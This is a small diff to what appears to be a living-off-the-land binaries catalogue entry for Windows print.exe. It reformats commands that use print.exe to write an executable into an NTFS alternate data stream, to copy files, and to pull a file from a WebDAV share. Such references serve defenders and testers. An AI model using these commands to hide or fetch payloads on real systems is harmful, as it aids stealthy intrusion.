@@ -5,13 +5,14 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: "print /D:c:\\ads\\file.txt:file.exe c:\\ads\\file.exe     \n     \n\
-      print /D:C:\\ads\\CopyOfFile.exe C:\\ads\\FileToCopy.exe\n\nprint /D:c:\\outfolder\\\
-      outfile.exe \\\\webdavserver\\folder\\file.exe"
+  - Command: |
+          print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe
+          print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe
+          print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
     Description: ''
 Full Path:
-  - c:\windows\system32\print.exe
-  - c:\windows\sysWOW64\print.exe
+  - C:\Windows\System32\print.exe
+  - C:\Windows\SysWOW64\print.exe
 Code Sample: []
 Detection: []
 Resources:
